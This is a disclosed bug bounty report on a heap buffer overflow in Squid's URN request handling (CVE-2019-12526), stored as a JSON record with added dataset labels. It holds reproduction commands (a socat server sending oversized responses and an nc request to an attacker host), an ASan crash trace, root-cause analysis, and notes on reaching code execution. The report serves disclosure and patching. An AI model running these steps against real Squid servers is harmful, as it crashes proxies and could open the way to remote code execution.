{
  "reported_to": "Internet Bug Bounty",
  "reported_by": "jeriko_one ",
  "title": "UrnState Heap Overflow",
  "content": "\nSummary:\nWhen handling a URN Request an attacker controlled response can cause Squid to overflow a heap buffer. The buffer exist within a struct so not only does it allow an attacker to overflow adjacent memory, but also control a pointer that follows the buffer enabling them to free arbitrary memory. Paired with the Cache Manager bypass that I reported earlier, an attacker will know which addresses are valid. This can lead to RCE and was stated in the serverity of the Squid announce.\nSquid Announce: http://www.squid-cache.org/Advisories/SQUID-2019_7.txt\nAssigned CVE-2019-12526\nSteps To Reproduce:\nYou must add the following to your squid.conf to allow URN request\nCode 21 Bytes\n1acl Safe_ports port 0\nThe squid child will crash even without Asan, but it'll automatically restart. You can check PIDs to confirm it did crash or you can build with ASan if you want to see the crash output.\nCode 105 Bytes\n1$ export CFLAGS=\"${CFLAGS} -fsanitize=address -g\"\n2$ export CXXFLAGS=\"${CXXFLAGS} ${CFLAGS}\"\n3\n4$./configure\nI would also set the following ASan flags\nCode 60 Bytes\n1export ASAN_OPTIONS=\"detect_leaks=false abort_on_error=true\"\n1) Start Squid\nCode 32 Bytes\n1./sbin/squid --foreground -d 100\n1) Start a server that will output 4096 bytes\nCode 76 Bytes\n1$ socat TCP-LISTEN:8080,fork SYSTEM:\"python -c \\'print\\(\\\\\\\"A\\\\\\\" * 4096)\\'\"\n2) Make a URN request to this server\nCode 85 Bytes\n1$ echo -e \"GET urn::@<attacker IP>:8080/ HTTP/1.1\\r\\n\\r\\n\" |nc <squid hostname> 3128\n2\nCode 7.91 KiB\n1=================================================================\n2==4723==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x621000067958 at pc 0x7f0d8a44deed bp 0x7ffff8eef4b0 sp 0x7ffff8eeec58\n3WRITE of size 81 at 0x621000067958 thread T0\n4    #0 0x7f0d8a44deec  (/usr/lib/gcc/x86_64-pc-linux-gnu/9.2.0/libasan.so.5+0x9feec)\n5    #1 0x563906dc1389 in mem_hdr::copyAvailable(mem_node*, long, unsigned long, char*) const /home/j1/h4x/squid/releases/squid-4.8/src/stmem.cc:202\n6    #2 0x563906dc1f58 in mem_hdr::copy(StoreIOBuffer const&) const /home/j1/h4x/squid/releases/squid-4.8/src/stmem.cc:262\n7    #3 0x563906de76d7 in store_client::scheduleMemRead() /home/j1/h4x/squid/releases/squid-4.8/src/store_client.cc:424\n8    #4 0x563906de6f0c in store_client::scheduleRead() /home/j1/h4x/squid/releases/squid-4.8/src/store_client.cc:391\n9    #5 0x563906de691f in store_client::doCopy(StoreEntry*) /home/j1/h4x/squid/releases/squid-4.8/src/store_client.cc:352\n10    #6 0x563906de6082 in storeClientCopy2 /home/j1/h4x/squid/releases/squid-4.8/src/store_client.cc:306\n11    #7 0x563906de4ac4 in storeClientCopyEvent /home/j1/h4x/squid/releases/squid-4.8/src/store_client.cc:145\n12    #8 0x563906c3cc8e in EventDialer::dial(AsyncCall&) /home/j1/h4x/squid/releases/squid-4.8/src/event.cc:41\n13    #9 0x563906c3d7c6 in AsyncCallT<EventDialer>::fire() ../src/base/AsyncCall.h:145\n14    #10 0x563906fd75cd in AsyncCall::make() /home/j1/h4x/squid/releases/squid-4.8/src/base/AsyncCall.cc:40\n15    #11 0x563906fd90b5 in AsyncCallQueue::fireNext() /home/j1/h4x/squid/releases/squid-4.8/src/base/AsyncCallQueue.cc:56\n16    #12 0x563906fd8bfc in AsyncCallQueue::fire() /home/j1/h4x/squid/releases/squid-4.8/src/base/AsyncCallQueue.cc:42\n17    #13 0x563906c3e8ac in EventLoop::dispatchCalls() /home/j1/h4x/squid/releases/squid-4.8/src/EventLoop.cc:144\n18    #14 0x563906c3e42e in EventLoop::runOnce() /home/j1/h4x/squid/releases/squid-4.8/src/EventLoop.cc:109\n19    #15 0x563906c3e052 in EventLoop::run() /home/j1/h4x/squid/releases/squid-4.8/src/EventLoop.cc:83\n20    #16 0x563906d35a0e in SquidMain(int, char**) /home/j1/h4x/squid/releases/squid-4.8/src/main.cc:1709\n21    #17 0x563906d34102 in SquidMainSafe /home/j1/h4x/squid/releases/squid-4.8/src/main.cc:1417\n22    #18 0x563906d3404f in main /home/j1/h4x/squid/releases/squid-4.8/src/main.cc:1405\n23    #19 0x7f0d89723eaa in __libc_start_main (/lib64/libc.so.6+0x23eaa)\n24    #20 0x563906ae3b59 in _start (/home/j1/h4x/squid/debug/squid-4.8/sbin/squid+0x484b59)\n25\n260x621000067958 is located 0 bytes to the right of 4184-byte region [0x621000066900,0x621000067958)\n27allocated by thread T0 here:\n28    #0 0x7f0d8a4c59ae in __interceptor_calloc (/usr/lib/gcc/x86_64-pc-linux-gnu/9.2.0/libasan.so.5+0x1179ae)\n29    #1 0x563907343217 in xcalloc /home/j1/h4x/squid/releases/squid-4.8/compat/xalloc.cc:83\n30    #2 0x56390731d954 in MemPoolMalloc::allocate() /home/j1/h4x/squid/releases/squid-4.8/src/mem/PoolMalloc.cc:35\n31    #3 0x563907317412 in MemImplementingAllocator::alloc() /home/j1/h4x/squid/releases/squid-4.8/src/mem/Pool.cc:204\n32    #4 0x563906b62af5 in cbdataInternalAlloc(int, char const*, int) /home/j1/h4x/squid/releases/squid-4.8/src/cbdata.cc:238\n33    #5 0x563906e36d1c in UrnState::operator new(unsigned long) /home/j1/h4x/squid/releases/squid-4.8/src/urn.cc:32\n34    #6 0x563906e344c1 in urnStart(HttpRequest*, StoreEntry*) /home/j1/h4x/squid/releases/squid-4.8/src/urn.cc:211\n35    #7 0x563906c609cb in FwdState::Start(RefCount<Comm::Connection> const&, StoreEntry*, HttpRequest*, RefCount<AccessLogEntry> const&) /home/j1/h4x/squid/releases/squid-4.8/src/FwdState.cc:373\n36    #8 0x563906bac622 in clientReplyContext::processMiss() /home/j1/h4x/squid/releases/squid-4.8/src/client_side_reply.cc:783\n37    #9 0x563906bb947e in clientReplyContext::doGetMoreData() /home/j1/h4x/squid/releases/squid-4.8/src/client_side_reply.cc:1855\n38    #10 0x563906bb76d1 in clientReplyContext::identifyFoundObject(StoreEntry*) /home/j1/h4x/squid/releases/squid-4.8/src/client_side_reply.cc:1707\n39    #11 0x563906bae43c in clientReplyContext::created(StoreEntry*) /home/j1/h4x/squid/releases/squid-4.8/src/client_side_reply.cc:937\n40    #12 0x563906dc96e7 in StoreEntry::getPublicByRequest(StoreClient*, HttpRequest*) /home/j1/h4x/squid/releases/squid-4.8/src/store.cc:524\n41    #13 0x563906bb716e in clientReplyContext::identifyStoreObject() /home/j1/h4x/squid/releases/squid-4.8/src/client_side_reply.cc:1667\n42    #14 0x563906bb8cab in clientGetMoreData /home/j1/h4x/squid/releases/squid-4.8/src/client_side_reply.cc:1813\n43    #15 0x563906bead08 in clientStreamRead(clientStreamNode*, ClientHttpRequest*, StoreIOBuffer) /home/j1/h4x/squid/releases/squid-4.8/src/clientStream.cc:182\n44    #16 0x563906bd20c6 in ClientHttpRequest::httpStart() /home/j1/h4x/squid/releases/squid-4.8/src/client_side_request.cc:1542\n45    #17 0x563906bd1c94 in ClientHttpRequest::processRequest() /home/j1/h4x/squid/releases/squid-4.8/src/client_side_request.cc:1528\n46    #18 0x563906bd528d in ClientHttpRequest::doCallouts() /home/j1/h4x/squid/releases/squid-4.8/src/client_side_request.cc:1896\n47    #19 0x563906bcc18a in ClientRequestContext::clientAccessCheckDone(allow_t const&) /home/j1/h4x/squid/releases/squid-4.8/src/client_side_request.cc:830\n48    #20 0x563906bcacf5 in ClientRequestContext::clientAccessCheck2() /home/j1/h4x/squid/releases/squid-4.8/src/client_side_request.cc:729\n49    #21 0x563906bd383f in ClientHttpRequest::doCallouts() /home/j1/h4x/squid/releases/squid-4.8/src/client_side_request.cc:1781\n50    #22 0x563906bcc18a in ClientRequestContext::clientAccessCheckDone(allow_t const&) /home/j1/h4x/squid/releases/squid-4.8/src/client_side_request.cc:830\n51    #23 0x563906bcae38 in clientAccessCheckDoneWrapper /home/j1/h4x/squid/releases/squid-4.8/src/client_side_request.cc:741\n52    #24 0x563906f171b9 in ACLChecklist::checkCallback(allow_t) /home/j1/h4x/squid/releases/squid-4.8/src/acl/Checklist.cc:169\n53    #25 0x563906f15b23 in ACLChecklist::completeNonBlocking() /home/j1/h4x/squid/releases/squid-4.8/src/acl/Checklist.cc:54\n54    #26 0x563906f17c5b in ACLChecklist::nonBlockingCheck(void (*)(allow_t, void*), void*) /home/j1/h4x/squid/releases/squid-4.8/src/acl/Checklist.cc:257\n55    #27 0x563906bca91a in ClientRequestContext::clientAccessCheck() /home/j1/h4x/squid/releases/squid-4.8/src/client_side_request.cc:709\n56    #28 0x563906bd3255 in ClientHttpRequest::doCallouts() /home/j1/h4x/squid/releases/squid-4.8/src/client_side_request.cc:1753\n57    #29 0x563906bc87b9 in ClientRequestContext::hostHeaderVerify() /home/j1/h4x/squid/releases/squid-4.8/src/client_side_request.cc:600\n58\n59SUMMARY: AddressSanitizer: heap-buffer-overflow (/usr/lib/gcc/x86_64-pc-linux-gnu/9.2.0/libasan.so.5+0x9feec) \n60Shadow bytes around the buggy address:\n61  0x0c4280004ed0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n62  0x0c4280004ee0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n63  0x0c4280004ef0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n64  0x0c4280004f00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n65  0x0c4280004f10: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n66=>0x0c4280004f20: 00 00 00 00 00 00 00 00 00 00 00[fa]fa fa fa fa\n67  0x0c4280004f30: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n68  0x0c4280004f40: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n69  0x0c4280004f50: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n70  0x0c4280004f60: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n71  0x0c4280004f70: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n72Shadow byte legend (one shadow byte represents 8 application bytes):\n73  Addressable:           00\n74  Partially addressable: 01 02 03 04 05 06 07 \n75  Heap left redzone:       fa\n76  Freed heap region:       fd\n77  Stack left redzone:      f1\n78  Stack mid redzone:       f2\n79  Stack right redzone:     f3\n80  Stack after return:      f5\n81  Stack use after scope:   f8\n82  Global redzone:          f9\n83  Global init order:       f6\n84  Poisoned by user:        f7\n85  Container overflow:      fc\n86  Array cookie:            ac\n87  Intra object redzone:    bb\n88  ASan internal:           fe\n89  Left alloca redzone:     ca\n90  Right alloca redzone:    cb\n91  Shadow gap:              cc\n92==4723==ABORTING\nAnalysis\nWhen handling an URN request from a user Squid makes a request to the remote\nserver to retrieve a list of URLs. The response is handled via urnHandleReply.\nThe response from the server is buffered into urnState->reqbuf as Squid reads\ndata in. This buffer is of length URN_REQBUF_SZ 4096\nurnHandleReply can be called into multiple times as it waits for\nurlres_e->store_status != STORE_PENDING and the current offset into reqbuf\nheld by urnState->reqofs is less than URN_REQBUF_SZ.\nCode 431 Bytes\n1    if (urlres_e->store_status == STORE_PENDING &&\n2            urnState->reqofs < URN_REQBUF_SZ) {\n3        tempBuffer.offset = urnState->reqofs;\n4        tempBuffer.length = URN_REQBUF_SZ;\n5        tempBuffer.data = urnState->reqbuf + urnState->reqofs;\n6        storeClientCopy(urnState->sc, urlres_e,\n7                        tempBuffer,\n8                        urnHandleReply,\n9                        urnState);\n10        return;\n11    }\nurnHandleReply will prepare a StoreIOBuffer object filling it with urnState\nbuffer, reqofs, and how the length.\nUnfortunately this tempBuffer has the total length of urnState->reqbuf\nURN_REQBUF_SZ, instead of the amount of data that is left. Whenever the\nresponse is being copied a second time into the buffer it can overflow. The\nattacker can control how much is overflowed by adjusting the response.\nImpact\nThis overflow has 2 useful features for someone trying to exploit Squid. The\nfirst obvious one being overflowing into an adjacent memory region. An\nattacker that was able to align the heap in such a way that a virtual table\npointer was after the urnState object could gain control of the instructor\npointer, thus, gaining control of the Squid process.\nThe second is that before urnState overflows into that adjacent object it will\noverflow the pointer urlres within itself. This pointer later is free'd. An\nattacker with knowledge of current addresses in Squid could use this to\ntrigger a Use-After-Free.\n\n",
  "severity": [
    9.8,
    null
  ],
  "bounty": null,
  "weaknesses": [
    "Classic Buffer Overflow"
  ],
  "screenshots": {},
  "disclosed_date": 1630035360,
  "report_url": "https://hackerone.com/reports/824771",
  "is_multi_component": false,
  "complexity": "HIGH",
  "novelty": "MEDIUM",
  "vuln_category": "API",
  "steps": [
    [
      1,
      "Configure Squid to allow URN requests by adding 'acl Safe_ports port 0' to squid.conf"
    ],
    [
      2,
      "Start Squid with './sbin/squid --foreground -d 100'"
    ],
    [
      3,
      "Set up a server to output 4096 bytes using 'socat TCP-LISTEN:8080,fork SYSTEM:\"python -c 'print(\\\"A\\\" * 4096)'\"'"
    ],
    [
      4,
      "Make a URN request to the server using 'echo -e \"GET urn::@<attacker IP>:8080/ HTTP/1.1\\r\\n\\r\\n\" |nc <squid hostname> 3128'"
    ]
  ],
  "vuln_description": "The vulnerability is a heap buffer overflow in Squid when handling URN requests. An attacker-controlled response can overflow a heap buffer within a struct, allowing the attacker to overflow adjacent memory and control a pointer that follows the buffer, enabling arbitrary memory freeing. This can lead to remote code execution (RCE) when paired with knowledge of valid memory addresses.",
  "reason": "The vulnerability involves understanding the URN request handling in Squid, the heap buffer overflow mechanism, and the subsequent memory manipulation. The attacker needs to control the response size and align the heap correctly to exploit the vulnerability. The interaction between the URN request handling and the buffer overflow is non-obvious and requires precise manipulation of the application state.",
  "new_complexity": "HIGH",
  "requires_code": true,
  "requires_CVE": true,
  "is_ctf": false,
  "other_report": null
}